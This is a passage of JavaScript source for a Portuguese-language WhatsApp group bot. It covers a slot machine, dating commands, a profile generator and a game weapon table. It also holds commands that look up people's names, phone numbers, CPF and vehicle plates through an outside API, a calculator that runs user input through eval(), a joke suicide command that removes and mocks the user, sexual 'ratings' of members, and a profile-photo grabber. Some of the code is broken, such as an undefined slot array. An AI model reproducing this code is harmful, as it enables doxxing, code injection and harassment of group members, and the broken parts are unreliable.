if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (!isGroup) return reply('Voce so pode jogar em grupos')
reagir(from, "üé∞")
await sleep(600)
 const soto = [
'üçä : üçí : üçê',
'üçí : üîî : üçä',
'üçá : üçá : üçá',
'üçä : üçã : üîî',
'üîî : üçí : üçê',
'üîî : üçí : üçä',
'üçä : üçã : üçä',		
'üçê : üçí : üçã',
'üçê : üçê : üçê',
'üçä : üçí : üçí',
'üîî : üîî : üçá',
'üçå : üçí : üîî',
'üçê : üîî : üîî',
'üçä : üçã : üçí',
'üçã : üçã : üçå',
'üîî : üîî : üçá',
'üîî : üçê : üçá',
'üîî : üîî : üîî',
'üçí : üçí : üçí',
'üçå : üçå : üçå'
]		
const mining = Math.ceil(Math.random() * 1000) +1
const somtoy2 = exportion[Math.floor(Math.random() * exportion.length)]
if ((somtoy2 == 'ü•ë : ü•ë : ü•ë') ||(somtoy2 == 'üçâ : üçâ : üçâ') ||(somtoy2 == 'üçì : üçì : üçì') ||(somtoy2 == 'üçé : üçé : üçé') ||(somtoy2 == 'üçç : üçç : üçç') ||(somtoy2 == 'ü•ù : ü•ù : ü•ù') ||(somtoy2 == 'üçë : üçë : üçë') ||(somtoy2 == 'ü•• : ü•• : ü••') ||(somtoy2 == 'üçã : üçã : üçã') ||(somtoy2 == 'üçê : üçê : üçê') ||(somtoy2 == 'üçå : üçå : üçå') ||(somtoy2 == 'üçí : üçí : üçí') ||(somtoy2 == 'üîî : üîî : üîî') ||(somtoy2 == 'üçä : üçä : üçä') ||(somtoy2 == 'üçá : üçá : üçá')) {
var Vit√≥ria = `‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞ ‚òÖ ‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞
¬†‚ò≤¬†‚ñ∫  Voce ganhouüîÆ  ‚óÑ‚ò≤
‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞ ‚òÖ ‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞`

} else {
var Vit√≥ria = `‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞ ‚òÖ ‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞
¬†‚ò≤¬†‚ñ∫    Voce perdeu...    ‚óÑ‚ò≤
‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞ ‚òÖ ‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞`
}
	const cassino = `
   Õ°Õú€ú€£€ú‚òÜ ‚ò≤¬†‚ñ∫ ùêÇùêÄùêíùêíùêàùêçùêé ‚óÑ‚ò≤  ‚òÜÕ°Õú€ú€ú€£
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏üé∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
 Õ°Õú€ú€£€ú‚òÜ ‚ò≤¬†‚ñ∫¬†${somtoy2} ‚óÑ‚ò≤ ‚òÜÕ°Õú€ú€ú€£¬†¬† 
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏üé∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ

*${Vit√≥ria}*`
reply(cassino)
if (Vit√≥ria == `‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞ ‚òÖ ‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞
¬†‚ò≤¬†‚ñ∫   Voc√™ ganhou...üéä   ‚óÑ‚ò≤
‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞ ‚òÖ ‚ñ±‚ñ∞‚ñ±‚ñ∞‚ñ±‚ñ∞`) {

reply('Parab√©ns')
}
await (sender)
break

case 'suicidio':
case 'suic√≠dio':
setTimeout(() => {reagir(from, `ü•∫`)}, 100)
{
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
reply(`ü•∫ Lembre-se ${pushname} voc√™ sempre estara em nossos cora√ß√µes! ‚òîüòî`)
await sleep(3000)
amy.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(1000)
reply('Agora que ja se foi vamos falar mal dele')
}
break

case 'namorar': case 'pediremnamoro':
if(!isGroup) return reply(`> `+reply.msg.grupo)

if(!menc_os2) return reply('Marque a mensagem ou o @ que queira pedir ela em namoro. Se voc√™ tomar um fora, ju√≠zo!')

if(numeroBot.includes(menc_os2)) return reply("N√£o √© poss√≠vel pedir o bot em namoro, seu baitola.üôÑ")

if(JSON.stringify(namoro2).includes(menc_os2)) return reply(`Este usu√°rio j√° foi pedido em namoro...`)

if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == false) return reply(`Essa pessoa j√° pediu algu√©m em namoro... Sinto muito ${pushname} üòï`)

if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == true) return reply(`N√£o ser√° poss√≠vel pedir essa pessoa em namoro, pois a mesma j√° est√° com outro(a). üåö`)

if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == false) return mention(`Voc√™ j√° pediu para namorar com o (a) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}. N√£o brinque com os sentimentos dos outros! Se decida logo ou digite: ${prefix}cancelarpedido`)

if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return mention(`Voc√™ j√° est√° namorando com o (a) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}...`)

namoro1.push({usu1: sender, usu2: menc_os2.split('@')[0], namorados: false, idgp: from, hora: hora, data: date})

fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.push({id: menc_os2, pedido: sender.split('@')[0], idgp: from})

fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))

amy.sendMessage(from, {video: {url: `https://telegra.ph/file/cc313adcf306bf602c695.mp4`}, gifPlayback: true, caption: `Querido *@${menc_os2.split('@')[0]}*, o(a) *@${sender.split('@')[0]}* deixou uma *cartinha* para voc√™!\n‚Äì\n‚ÄúSaber que voc√™ √© parte da minha vida me faz sentir aben√ßoado. Desde o primeiro dia em que me aproximei de voc√™, sabia que havia algo especial ali. Agora, depois de tanto tempo, quero declarar oficialmente nosso amor.‚Äù\n‚Äì\nEai voc√™ aceita namorar com *@${sender.split('@')[0]}* e viver um felizes para sempre?\n‚Ä¢ Para aceitar o pedido, digite: ‚ÄúSim‚Äù\n‚Ä¢ Para recusar o pedido, digite: ‚ÄúN√£o‚Äù.`, mentions: [menc_os2, sender]})
break

case 'cancelarpedido':
if(!isGroup) return reply(`> `+reply.msg.grupo)

if(!JSON.stringify(namoro1).includes(sender)) return reply("N√£o h√° pedido de namoro para cancelar.")

C13 = namoro1.map(i => i.usu1).indexOf(sender)

C15 = namoro2.map(i => i.id).indexOf(namoro1[C13].usu2 + "@s.whatsapp.net")

if(namoro1[C13].namorados == true) return reply("N√£o √© poss√≠vel cancelar o pedido de namoro depois de aceito.")

namoro1.splice(C13, 1)

fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C15, 1)

fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))

reply("Pedido de namoro cancelado com sucesso.")

break

case 'terminar':
// @Matheus
if(!JSON.stringify(namoro1).includes(sender)) return reply(`Voc√™ n√£o est√° namorando com ningu√©m. Sinto muito!`)

D1 = namoro1.map(i => i.usu1).indexOf(sender)
D2 = namoro1.map(a => a.usu1).indexOf(`${namoro1[D1].usu2}@s.whatsapp.net`)
namoro1[D2].namorados = false
reply(`*Agora voc√™ est√° totalmente solteiro seu desgra√ßado(a) gosta de brincar com sentimentos, ja avisei seu parceiro sobre o t√©rmino* üòë`)
amy.sendMessage(`${namoro1[D1].usu2}@s.whatsapp.net`, {text: `Tenho uma not√≠cia ruim sobre seu namoro, ele(a) acaba de terminar.\n‚Äì\n‚Ä¢ Seja feliz e lembre dos todos os bons momentos que voc√™s tiveram juntos.`}, {quoted: info})
namoro1.splice(D2, 1)
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro1.splice(D1, 1)
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
break

case 'minhadupla': case 'dupla':
// @Matheus
if(!isGroup) return reply(reply.msg.grupo)
if(!JSON.stringify(namoro1).includes(sender)) return reply(`Voc√™ n√£o est√° namorando com ningu√©m. Sinto muito!`)
reagir(from, "‚ù§Ô∏è‚Äçü©π")
D1 = namoro1.map(i => i.usu1).indexOf(sender)
if(namoro1[D1].namorados == false) return reply(`A pessoa que voc√™ pediu em namoro n√£o aceitou o pedido ainda. Portanto, n√£o √© poss√≠vel consultar os dados da dupla.Ô∏è`)
txt = `@${namoro1[D1].usu1.split('@')[0]} namora com @${namoro1[D1].usu2}\n‚Äì\n‚Ä¢ O pedido de namoro ocorreu √†s ${namoro1[D1].hora} do dia ${namoro1[D1].data}.\n‚Äì\n‚Ä¢ Para realizar o t√©rmino do namoro, use: *${prefix}terminar*`
mencionarIMG(txt, "https://telegra.ph/file/6ccd40ca7d42bd6f8d6f5.jpg")
break

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ùôàùôÄùôâùôê ùôëùôÑùôã‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏



case 'cronometro': case 'cron√¥metro':

async function CronZ(txt) {
const totalTime = 10 * 59;

function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}

let { key } = await amy.sendMessage(from, { text: `${txt} ${txt.length > 0 ? "\n" : ""}Tempo restante: 10:00` }, { quoted: info });
for (let i = totalTime - 1; i >= 0; i--) {
const minutes = Math.floor(i / 59);
const seconds = i % 59;
const timeString = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
await sleep(2000);
amy.sendMessage(from, { text: `${txt} ${txt.length > 0 ? "\n" : ""}\n> Tempo restante: ${timeString}`, edit: key }, { quoted: info });
}
await amy.sendMessage(from, { text: `${txt.length > 0 ? "\n" : ""}Finalizado!` }, { quoted: info });
}

CronZ('<<<< Mensagem Cronometro >>>>');
break
    


//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ùôàùôÄùôâùôê18‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏

case 'nome':
case 'telefone':
case 'cpf':
case 'cpf2':
case 'placa':
case 'cnpj':
if (!q) return reply('Informe o dado que deseja consultar ap√≥s o comando.');
reply('Consultando...');
const consulta = await fetchJson(`https://api.cariflex.xyz/api/consulta/${command}?query=${q}`);
if (consulta.file) {
const resultado = Buffer.from(consulta.base64, 'base64'); 
await amy.sendMessage(from, { document: resultado, fileName: `${q}.txt`, mimetype: 'text/plain' });
}
else {
if (consulta.resultado) {
await amy.sendMessage(from, { text: consulta.resultado });
}
}
break;
    
case 'plaq1': 
case 'plaq2':
case 'plaq3':
case 'plaq4':
case 'plaq5':
case 'plaq6':
case 'plaq7':
case 'plaq8':
case 'plaq9':
case 'plaq10':
if(!q) return reply(`informe o seu nome`)
reply(" Sua plaquinha esta sendo enviada no pv")
plaq = await getBuffer(`https://api.cariflex.xyz/api/${command}?q=${q}`)
await amy.sendMessage(sender, 
{image: plaq}, 
{quoted: info}).catch(e => {
reply('Erro ao fazer sua plaquinha')
})
break


// Menu membros cases //

case 'perfil':
try {
ppimg = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
 ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'
}
try { 

var conselho2 = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const dptr = `     „Äå üî• ~_*PERFIL*_~ üåà „Äç
üóí *Nome* : *${pushname}*
ü™Ä *N√∫mero* : @${sender.split("@")[0]}
üêÇ *N√≠vel gado* : *${nivelgador}${nivelgado2r}%*
üì± *Seu C√©lular* : ${info.key.id.length > 21 ? 'Android ü§£' : info.key.id.substring(0, 2) == '3A' ? 'IOSüòÇüòÇüòÖ' : 'Zap zap web üòÇüòÇ‚òùüèºüòÖ'}
üòà *N√≠vel puta* : *${putar}${putar2}%*
üòã *N√≠vel de gostosura* : *${gostosurar}${gostosurar2}%*
üçº *Valor do programa* : *R$${programa}*`
amy.sendMessage(from, {image: {url: ppimg}, caption: dptr, mentions: [sender]}, {quoted: info})
} catch (e) {
console.log(e)
}
break


case 'roubarfoto':
    let user2;

    // Verifica se o comando foi usado com um n√∫mero
    const commandArgs = budy.trim().split(" ");
    if (commandArgs.length > 1) {
        // Usa o n√∫mero informado ap√≥s o comando
        user2 = `${commandArgs[1]}@s.whatsapp.net`;
    } 
    // Caso contr√°rio, verifica se √© uma resposta a uma mensagem
    else if (info.message.extendedTextMessage?.contextInfo?.quotedMessage) {
        user2 = info.message.extendedTextMessage.contextInfo.participant;
    } 
    // Caso n√£o tenha sido uma resposta, verifica se h√° men√ß√µes
    else if (info.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
        user2 = info.message.extendedTextMessage.contextInfo.mentionedJid[0];
    } 
    // Se n√£o for uma resposta, men√ß√£o ou n√∫mero, usa o remetente
    else {
        user2 = sender;
    }

    try {
        var ppimg = await amy.profilePictureUrl(user2, 'image');
    } catch {
        var ppimg = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'; // Imagem padr√£o caso n√£o haja foto
    }

    let username2 = user2.split("@")[0];
    amy.sendMessage(sender, {
        image: { url: ppimg },
        caption: `*_üé≠ A foto de perfil do(a)_* *@${username2}:*`,
        mentions: [user2]
    }, { quoted: info });
    break;

case "arma":
if(!isGroup) return reply(reply.msg.grupo)
{
bancoDeDados = {
"M1887": {
"nome": "M1887",
"descri√ß√£o": "Uma espingarda de cano duplo que inflige danos massivos em curta dist√¢ncia.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"AK47": {
"nome": "AK47",
"descri√ß√£o": "Rifle de assalto de alta pot√™ncia com alta taxa de disparo e precis√£o moderada.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"AWM": {
"nome": "AWM",
"descri√ß√£o": "Rifle de precis√£o capaz de derrubar inimigos com um √∫nico tiro.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"Groza": {
"nome": "Groza",
"descri√ß√£o": "Rifle de assalto altamente poderoso com uma taxa de disparo e precis√£o excepcionais.",
"dano": "Alto",
"alcance": "M√©dio",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"UMP45": {
"nome": "UMP45",
"descri√ß√£o": "Submetralhadora de alta cad√™ncia de tiro, equilibrada em termos de dano e controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 25
},
"M1014": {
"nome": "M1014",
"descri√ß√£o": "Uma espingarda de combate pr√≥xima com uma taxa de disparo e dano impressionantes.",
"dano": "Muito alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 6
},
"M60": {
"nome": "M60",
"descri√ß√£o": "Metralhadora com alto poder de fogo, ideal para suprimir inimigos e combates a m√©dia dist√¢ncia.",
"dano": "Alto",
"alcance": "M√©dio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 60
},
"XM8": {
"nome": "XM8",
"descri√ß√£o": "Rifle de assalto de alta efici√™ncia, com √≥timo equil√≠brio entre dano, alcance e taxa de disparo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"SCAR": {
"nome": "SCAR",
"descri√ß√£o": "Rifle de assalto confi√°vel, com boa precis√£o e controle de recuo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 30
},
"M4A1": {
"nome": "M4A1",
"descri√ß√£o": "Rifle de assalto vers√°til e equilibrado, adequado para v√°rias situa√ß√µes de combate.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 30
},
"SVD": {
"nome": "SVD",
"descri√ß√£o": "Rifle de precis√£o semi-autom√°tico, com √≥timo alcance e dano significativo.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
},
"MP5": {
"nome": "MP5",
"descri√ß√£o": "Submetralhadora compacta e precisa, adequada para combates em espa√ßos confinados.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"SPAS12": {
"nome": "SPAS12",
"descri√ß√£o": "Uma espingarda de a√ß√£o por bombeamento, eficaz a curta dist√¢ncia com alto dano.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 6
},
"KAR98K": {
"nome": "KAR98K",
"descri√ß√£o": "Rifle de precis√£o de a√ß√£o por ferrolho, com excelente precis√£o e dano letal.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"M249": {
"nome": "M249",
"descri√ß√£o": "Metralhadora leve com grande capacidade de muni√ß√£o, ideal para controle de √°rea.",
"dano": "Alto",
"alcance": "M√©dio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 100
},
"Thompson": {
"nome": "Thompson",
"descri√ß√£o": "Submetralhadora cl√°ssica de alta cad√™ncia de tiro e bom controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"VSS": {
"nome": "VSS",
"descri√ß√£o": "Rifle de assalto silencioso com escopo integrado e baixo recuo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 15
},
"MP40": {
"nome": "MP40",
"descri√ß√£o": "Submetralhadora de alta cad√™ncia de tiro e bom controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"AUG": {
"nome": "AUG",
"descri√ß√£o": "Rifle de assalto com excelente precis√£o, alcance e taxa de disparo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"G18": {
"nome": "G18",
"descri√ß√£o": "Pistola autom√°tica com alta taxa de disparo, ideal para combate pr√≥ximo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 20
},
"P90": {
"nome": "P90",
"descri√ß√£o": "Submetralhadora de alta cad√™ncia de tiro e capacidade de muni√ß√£o elevada.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 50
},
"Desert Eagle": {
"nome": "Desert Eagle",
"descri√ß√£o": "Pistola de alta pot√™ncia e precis√£o, com uma grande parada de energia.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 7
},
"Vector": {
"nome": "Vector",
"descri√ß√£o": "Submetralhadora compacta com alta cad√™ncia de tiro e boa precis√£o.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"M14": {
"nome": "M14",
"descri√ß√£o": "Rifle semiautom√°tico de alta precis√£o, ideal para combates de longa dist√¢ncia.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
},
"CG15": {
"nome": "CG15",
"descri√ß√£o": "Rifle de sinaliza√ß√£o que causa dano explosivo aos inimigos.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"USP": {
"nome": "USP",
"descri√ß√£o": "Pistola de m√©dio alcance com boa precis√£o e taxa de disparo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 12
},
"M1873": {
"nome": "M1873",
"descri√ß√£o": "Rev√≥lver de a√ß√£o simples com alto dano, mas taxa de disparo baixa.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"AN94": {
"nome": "AN94",
"descri√ß√£o": "Rifle de assalto com um modo de disparo especial que aumenta a taxa de disparo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"M79": {
"nome": "M79",
"descri√ß√£o": "Lan√ßador de granadas que causa danos em √°rea com alto poder de explos√£o.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"M14": {
"nome": "M14",
"descri√ß√£o": "Rifle semiautom√°tico de alta precis√£o, ideal para combates de longa dist√¢ncia.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
},
"CG15": {
"nome": "CG15",
"descri√ß√£o": "Rifle de sinaliza√ß√£o que causa dano explosivo aos inimigos.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"USP": {
"nome": "USP",
"descri√ß√£o": "Pistola de m√©dio alcance com boa precis√£o e taxa de disparo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 12
},
"M1873": {
"nome": "M1873",
"descri√ß√£o": "Rev√≥lver de a√ß√£o simples com alto dano, mas taxa de disparo baixa.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"AN94": {
"nome": "AN94",
"descri√ß√£o": "Rifle de assalto com um modo de disparo especial que aumenta a taxa de disparo.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"M79": {
"nome": "M79",
"descri√ß√£o": "Lan√ßador de granadas que causa danos em √°rea com alto poder de explos√£o.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"M82B": {
"nome": "M82B",
"descri√ß√£o": "Rifle de precis√£o de a√ß√£o por ferrolho com alto dano e capacidade de penetra√ß√£o.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"P90": {
"nome": "P90",
"descri√ß√£o": "Submetralhadora de alta cad√™ncia de tiro e capacidade de muni√ß√£o elevada.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 50
},
"Desert Eagle": {
"nome": "Desert Eagle",
"descri√ß√£o": "Pistola de alta pot√™ncia e precis√£o, com uma grande parada de energia.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 7
},
"M1887": {
"nome": "M1887",
"descri√ß√£o": "Espingarda de a√ß√£o por ferrolho com alto dano em combates de curta dist√¢ncia.",
"dano": "Extremo",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"XM8": {
"nome": "XM8",
"descri√ß√£o": "Rifle de assalto com boa precis√£o e cad√™ncia de tiro.",
"dano": "Moderado",
"alcance": "M√©dio",
"taxa_de_disparo": "M√©dia",
"capacidade_do_pente": 30
},
"KAR98K": {
"nome": "KAR98K",
"descri√ß√£o": "Rifle de precis√£o de a√ß√£o por ferrolho com alto dano e precis√£o.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"M79": {
"nome": "M79",
"descri√ß√£o": "Lan√ßador de granadas que causa danos em √°rea com alto poder de explos√£o.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"MP40": {
"nome": "MP40",
"descri√ß√£o": "Submetralhadora de alta cad√™ncia de tiro e bom controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"M14": {
"nome": "M14",
"descri√ß√£o": "Rifle semiautom√°tico de alta precis√£o, ideal para combates de longa dist√¢ncia.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
}
}
const armaPesquisada = args.join(" "); // Substitua pelo valor desejado
let resultado = null;
for (const arma in bancoDeDados) {
if (arma.toLowerCase() === armaPesquisada.toLowerCase()) {
resultado = bancoDeDados[arma];

break;
}
}
if (resultado) {
resultado = `Arma: ${resultado.nome}\n*${resultado.descri√ß√£o}*\n\nDano: *${resultado.dano}*\n\nAlcance: *${resultado.alcance}*\n\nTaxa de disparo: *${resultado.taxa_de_disparo}*\n\nCapacidade do pente: *${resultado.capacidade_do_pente}*`
amy.sendMessage(from, { image: { url: 'https://telegra.ph/file/098e3ff71f1f65ff88e84.jpg' }, caption: resultado}, {quoted: info})
} 
else {
reply('Esta arma nao foi encontrada no meu banco de dados');

}
} 
break

case 'gerarnick': case'nick':
if (!q) return reply(`informe o nome do seu nick`)
reagir(from,`üÜô`) 
try {
var nick = await fetchJson(`https://api.cariflex.xyz/api/fazernick?nome=${q}`)
amy.sendMessage(from, {image: {url: `https://i.imgur.com/U5beetu.jpeg`}, caption: `${nick}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'report':
case 'bug':
if (!q) return reply('informe o comando que esta com bug')
reply(`${pushname} Obrigado pela sua colabora√ß√£o, o bug foi reportado ao meu desenvolvedor.\nAgarde assim que poss√≠vel o bug sera resolvido\n<‚ùå> bug falso nao sera respondido !`)
const report = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
let templateMesssage = {
image: {url: `${report}`,
quoted: info},
caption: `      ‚ùó UM BUG REPORTADO ‚ùó\nUSUARIO: @${sender.split('@')[0]},\nBUG:${q}`,
footer: 'Noelle_md'
}
amy.sendMessage("559691542453@s.whatsapp.net",templateMesssage)
break

case 'novocmd':
if (!q) return reply('Informe o comando que voce quer que seja adicionado no bot.')
reply(`${pushname} Obrigado pela sua ideiq, ela foi enviada ao meu desenvolvedor.üòä`)
const comad = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
let templateMessage = {
image: {url: `${comad}`,
quoted: info},
caption:`      ‚ùó IDEIA DE COMADO ‚ùó\nUSUARIO: @${sender.split('@')[0]},\nCOMADO: ${q}`,
footer: 'Noelle_md'
}
amy.sendMessage("559691542453@s.whatsapp.net",templateMessage)
break

case 'calculadora':
case 'calcular':  
case 'calc':
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("√∑", "/")
return escrever(JSON.stringify(eval(rsp, null,'\t')))
break

case 'calendario':
case 'calend√°rio':
case 'dados':
var getGroups = await amy.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
hora16 = moment.tz('America/Sao_Paulo').format('HH:mm')
date16 = moment.tz('America/Sao_Paulo').format('DD/MM')
reply(`
*${tempo.toUpperCase()}*
üë§ ${pushname}

üë• *GRUPO:* ${isGroup ? groupName : "privado"}
üìÜ *DATA:* ${date16}
‚è∞ *HORA:* ${hora16}
ü§ñ *BOT:* ${botName}
üëë *DONO:* ${donoName}


